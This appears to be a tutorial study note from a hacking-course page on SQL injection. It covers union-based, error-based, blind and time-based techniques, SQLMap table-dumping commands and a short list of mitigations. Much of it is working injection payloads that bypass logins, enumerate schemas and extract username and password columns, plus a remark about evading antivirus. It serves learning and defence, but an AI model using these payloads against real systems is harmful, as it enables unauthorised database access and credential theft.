# Exploit a Database

[![sqlinjectionlm](../../_badges/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)

> Common databases are: MySQL, Microsoft SQL Server (MSSQL), MongoDB, GraphQL, PostgresSQL.<br> While you may see MariaDB, SQLite; Redis, and Oracle too.

<hr class="sl">

## Random

Note: this isn't a course about SQL, but stuff that may be useful to hackers.

<div class="row row-cols-md-2"><div>

* `service xxx status`: check if a service is enabled. 
  * `mysql`
  * `postgresql`
  * `...`
* `mysql -u root -p -h <ip>`: login as root to the database at `<ip>`
  * Use `mysql -u root -p` for a local database.
  * Try an empty password, as this is the default password for root. [You may check this article](https://redteamnation.com/mysql-user-defined-functions/).
</div><div>

Inside the SQL console, you may use

* `source <sql>`: in MySQL console, import a SQL file.

Note that even if you can insert a path, you should start the SQL console inside the folder with the SQL file, and only enter the filename. This is because, if the file is importing data from other files, it less likely to still work if the statements are executed from another folder than the one with the script.

* `DESCRIBE <table>`: see the structure of `<table>`
</div></div>

<hr class="sr">

## SQL Injections (SQLi)

<div class="row row-cols-md-2"><div>

Most websites are using SQL database to store records. For instance, when using a login form, the username will most likely be used to fetch a user, then there will be a check of the password.

In some cases, SQL injections are possible. It means that instead of providing our username, we will provide some SQL code that will be injected in the SQL request, and allow a hacker to access the database via the login form.

**Example of injectable PHP code**: this code is fetching a list of products matching the product name send by the client.

```php
$sql = "Select name,desc from product where name LIKE '%$name%'";
```

If the user enter the following payload (value) instead of a product name

```php
' UNION Select username,password FROM users-- -
```

Then, the SQL query that will be executed will be

```sql
Select name,desc from product where name LIKE '%' UNION Select username,password FROM users-- -%'
```

Notice that now, the query will return a list of product, concatenated with a list of usernames/password!
</div><div>

**Explanation**

**Inject `'`**: because we want to close the "Like", and avoid an error `[...] LIKE '%`.

```sql
Select name,desc from product where name LIKE '%'%'
```

**1. Inject `' --`**: the problem, is that now the query won't work, because we have 3 single quotes, and there is a trailing `%`. So, what we do is commenting the rest of the query.

```sql
Select name,desc from product where name LIKE '%' --%'
```

**2. Inject `'-- -`**:  The code above may not work on some DBMS, because they want a space between the start of a comment, and the comment itself. So, we add ` -`, to ensure that there is a space.

```sql
Select name,desc from product where name LIKE '%' -- -%'
```

**3. Have fun**: between `'%'` and `-- -%'`, we can write SQL code, through the syntax of the final query must be valid. In the example, we used `UNION Select username,password FROM users`, which is used to merge results of two queries.
</div></div>

<hr class="sl">

## SQLInjections in practice

<div class="row row-cols-md-2"><div>

There are many scenarios in which a hacker will find a SQL injection. The example above was a **Union-based SQLi**.


<table class="table table-bordered table-striped border-dark"><thead>
<tr><th>Name</th><th>Description</th></tr>
</thead><tbody>

<tr><td class="text-center" colspan="2"><b>In-band SQLi</b> (same channel to attack, and gather results)</td></tr>

<tr><td>Error-based</td><td>The simplest SQL injection. The SQL errors are displayed to the user. The hacker can easily use it to adapt the query, and broke into the database.
</td></tr>

<tr><td>Union-based</td><td>An attacker use an injectable entrypoint returning a list of results, and append to them records fetched illegally.
</td></tr>

<tr><td class="text-center" colspan="2"><b>Blind/inferential SQLi</b> (observe the database response to map it)</td></tr>

<tr><td>Boolean-based</td><td>The attack will first look for a successful injectable query. Then, it will append to the working query a condition such as  "AND is the DBMS starting with 's'". If the query is successful, then it means the answer was "yes". Question by question, the hacker is mapping the database.
</td></tr>

<tr><td>Time-based</td><td>The attack add in the request a call to <code>sleep(n)</code> if successful. If the request take $n$ seconds more than usual, then the hacker will know that the query was successful.</td></tr>

<tr><td>Others</td><td>Out-of-band-based, Voice-based, Stacked queries-based...
</td></tr>
</tbody></table>
</div><div>

**Payloads** are the values that you are using the break into the database.

* [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) (2.6k ⭐)
* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) (42.3k ⭐)
* Tools, such as SQLMap (25k ⭐)

Mitigations

* Use **prepared requests** (statements), they are ensuring that parameters of your queries are not interpreted as SQL code
* Input validation or escaping user input: You can filter input, but you CAN'T rely on it, as you filter will _most likely_ be bypassed
* Do not trust anyone. SQL injections may be delayed. You may do protect your login queries, but if the provided username is some SQL code, then any other request using the username may interpret it, hence you should secure every request, even if there are not handling data from the user, as they may later. You should use an API for better security.
</div></div>

<hr class="sr">

## SQLMap

<div class="row row-cols-md-2"><div>

From the [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap) (25k ⭐): "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.".

Try injecting a form

```bash
# try login.php
sqlmap -u URL/login.php
```

Try dumping the table "users" in the database "db_name"

```bash
sqlmap -u UGL/login.php -D db_name -T users –dump
```

Notes

* Try both with, and without union tests
* `XXX xxx is vulnerable`: enter yes to try exploiting this parameter
</div><div>

* `-u URL`: try injecting this URL
* `--dbs`: display all databases
* `--tables`: display tables
* `--column`: display columns
* `-C xx, yy`: display only columns xx, and yy
* `--dbms=some_dbms`: provide dbms, increase the chances of success
* `-D db_name`: the name of the database
* `--time-sec timeout`: specify a timeout
* `--dump`: save current data
* `--dump-all`: save all data
* `--batch`: do all requests at once (do not way for input)

> [SQLMap CheatSheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) (external)
</div></div>

> You can use **BurpSuite** with SQLMap. Once you intercepted a request, right-click on it, and use **Save item**. Then, in SQLMap, use `-r /path/to/your/saved/item`. If your antivirus is blocking SQLMap, this may bypass it.

<hr class="sl">

## Famous payloads

<div class="row row-cols-md-2"><div>

Testing if a SQL injection is possible. If it "works", it means that we will have "3 quotes" in the SQL query, so there will be an error.

```none
'
```
</div><div>

Login without password on a website that do password check in an injectable query. The `1=1` is, like `-- -`, something to support some DBMS that are not allowing "1", or "TRUE".

```none
' OR 1=1 -- -
```
</div></div>

<hr class="sr">

## Manual Union-based SQLi

<div class="row row-cols-md-2"><div>

**Union-based SQLi** can only be achieved is the two queries have the same number of attributes in the SELECT, as per the property of the UNION clause. Hence, we first need to find how many parameters there are in the unknown request. There are 2 ways

<details class="details-n">
<summary><b>error-based</b> using <code>UNION SELECT</code></summary>

```sql
-- you don't known the query
SELECT [...] UNION SELECT NULL -- fail
SELECT [...] UNION SELECT NULL, NULL -- fail
SELECT [...] UNION SELECT NULL, NULL, NULL -- fail
SELECT [...] UNION SELECT NULL, NULL, NULL, NULL -- OK
```

As the 4 query is successful, we know that there are 4 parameters in the select. Note that NULL is the most used, but you may use any value such as `1`, `2`...
</details>

<details class="details-n">
<summary><b>error-based</b> using <code>ORDER BY</code></summary>

`ORDER BY` can take an index, which is a shortcut for the $nth$ argument in the select. If you use an invalid $n$, then the requests fails.

```sql
-- you don't known the query
SELECT [...] ORDER BY 1 -- fail
SELECT [...] ORDER BY 2 -- fail
SELECT [...] ORDER BY 3 -- fail
SELECT [...] ORDER BY 4 -- OK
```
</details>

The second objective is to find the DBMS, and it's version, just to ensure that any following query is valid in the DBMS language. You can fetch the user too with `user()`.

```sql
SELECT [...] UNION SELECT @@version, NULL, NULL, NULL
```

> Note that there may be an error at this point if the server was expecting the first value of the select to be an "int" (for instance). Simply move the call of `@@version`, until it's successful.
</div><div>

The third objective is to find the database name.

```sql
SELECT [...] UNION SELECT database(), NULL, NULL, NULL
```

The fourth objective is to find the tables. Note that the following query will return one result, but if your attack channel allow you to display more than one, then you may remove the `group_concat`.

```sql
SELECT [...] UNION SELECT group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'
```

Then, you may want to know a column names given a table

```sql
SELECT [...] UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE TABLE_NAME='table_name'
```

Now, you have everything you need to dump all results.

```sql
SELECT [...] UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM table_name
```
</div></div>

<hr class="sl">

## Manual Error-based SQLi

<div class="row row-cols-md-2"><div>

You better be prepared, manual error-based SQLi may take QUITE some time, as you may have to iterate a lot of characters. Let's say you found the following GET form to be injectable. If you use "1", you can see a valid account, but if you return "0", you will see "page not found".

```http request
GET /account?id=1
```

Then, your starting point will be

```http request
GET /account?id=1' AND 1=0-- -
```

Now, the id is valid, but you will see "page not found". That's how you will have to play with the request. When you got "page not found", it will mean that you condition failed, and bit-by-bit you will map the database. There are two well-known way to process

* Using ASCII

```
WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
-- extract the the first character (pos=1, len=1)
-- of a text 'text'. Convert the character to ASCII
-- and, check if this is the same as the ASCII of 'a'
```

* Using LIKE

```
WHERE text LIKE 'a%'
-- is text starting with 'a'
```

> I will, obviously use LIKE, because it's more efficient
</div><div>

First, to avoid losing too much motivation, it may be better to test how many characters you are looking for. For instance, for the database name

```
' AND LENGTH(database()) > 5 -- -
' AND LENGTH(database()) > 15 -- -
' AND LENGTH(database()) > 12 -- -
' AND LENGTH(database()) == 14 -- --
[...]
```

Then, you can start. As everything is the same as for **Union-based SQLi**, and the process is the same for every text, I will only show an example with getting the database name.

```
' AND database() LIKE '%' -- - // test, should always be true
' AND database() LIKE 'a%' -- - // starting
' AND database() LIKE 'b%' -- -
[...]
' AND database() LIKE 'm%' -- - // ok
' AND database() LIKE 'ma%' -- -
' AND database() LIKE 'mb%' -- -
[...]
' AND database() LIKE 'my_example' -- - // found 😢
```

Sometimes, there maybe more than one match. For instance, we could have a database starting with `my_`. In such case, to know if there are more databases like this, you have to exclude the one you found.

```
' AND database()!='my_example' AND database() LIKE 'my_%' -- -
```

If the query returns true, you may have one more database to check up. In the end, you will have to do like union, and work with queries like

```
' UNION SELECT NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema = 'database_name' and table_name like 'table_name' and COLUMN_NAME LIKE "a%" -- -
```

You may try other kind of question than only "is the nth character x".

```
-- do the table name contains 0?
table_name LIKE '%0%'
```
</div></div>

<hr class="sr">

## Manual Time-based SQLi

<div class="row row-cols-md-2"><div>

This kind of SQLi is quite similar to **Error-based SQLi**, the only difference being that instead of using

```
UNION SELECT NULL
```

We will use

```
UNION SELECT SLEEP(5)
```
</div><div>

The SELECT is only applied on the elements returned after applying the WHERE, if there are none, then the SLEEP function won't be called, and if so, it the hacker didn't have to wait $n$ seconds, it will indicate that the where was false.

For instance, on a login page in which you don't know the credentials, you will most likely don't know if the query failed, there are too many possibilities as to why. But, using time-based SQLi, if the request take a fixed amount of time, you will be sure of the answer to your question.
</div></div>